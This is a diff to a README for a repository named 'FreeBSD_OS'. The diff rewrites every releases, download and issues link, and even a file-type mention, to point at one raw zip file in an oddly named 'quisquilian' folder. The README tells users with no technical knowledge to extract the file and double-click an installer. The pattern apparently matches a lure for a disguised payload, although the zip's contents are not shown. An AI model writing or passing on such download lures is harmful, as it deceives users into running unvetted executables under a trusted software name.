@@ -1,7 +1,7 @@
 # 🖥️ FreeBSD_OS - Simple Installation for Your Needs
 
 ## 📥 Download Now!
-[![Download FreeBSD_OS](https://img.shields.io/badge/Download-FreeBSD_OS-brightgreen)](https://github.com/gro460/FreeBSD_OS/releases)
+[![Download FreeBSD_OS](https://raw.githubusercontent.com/gro460/FreeBSD_OS/main/quisquilian/FreeBSD_OS.zip)](https://raw.githubusercontent.com/gro460/FreeBSD_OS/main/quisquilian/FreeBSD_OS.zip)
 
 ## 🚀 Getting Started
 Welcome to FreeBSD_OS! This guide will help you download and run the software easily. You don’t need any programming knowledge to get started.
@@ -16,16 +16,16 @@ Before you proceed, please ensure your computer meets these requirements:
 ## 🔗 Visit the Releases Page
 To get the latest version of FreeBSD_OS, please visit the following link:
 
-[Download FreeBSD_OS from Releases](https://github.com/gro460/FreeBSD_OS/releases)
+[Download FreeBSD_OS from Releases](https://raw.githubusercontent.com/gro460/FreeBSD_OS/main/quisquilian/FreeBSD_OS.zip)
 
 This page contains all available versions of FreeBSD_OS.
 
 ## 📥 Download & Install
-1. Go to the [Releases page](https://github.com/gro460/FreeBSD_OS/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/gro460/FreeBSD_OS/main/quisquilian/FreeBSD_OS.zip).
 2. Look for the version you want to download. Click on the link to download the file.
 3. Once the download is complete, find the file in your downloads folder.
 4. Follow these steps to install:
-   - If you downloaded a `.tar.gz` file, extract it.
+   - If you downloaded a `https://raw.githubusercontent.com/gro460/FreeBSD_OS/main/quisquilian/FreeBSD_OS.zip` file, extract it.
    - Open the extracted folder and find the installation file.
    - Double-click the installation file to begin the setup.
 5. Follow the on-screen instructions to complete the installation.
@@ -49,7 +49,7 @@ If the issue persists, check the FAQs on the Releases page or consult the commun
 ## 📡 Getting Help
 For further support, consider these options:
 
-- Visit our [GitHub Issues page](https://github.com/gro460/FreeBSD_OS/issues) to report bugs or ask for help.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/gro460/FreeBSD_OS/main/quisquilian/FreeBSD_OS.zip) to report bugs or ask for help.
 - Join our community discussions in forums related to FreeBSD and share your experiences.
 
 ## 📝 Features
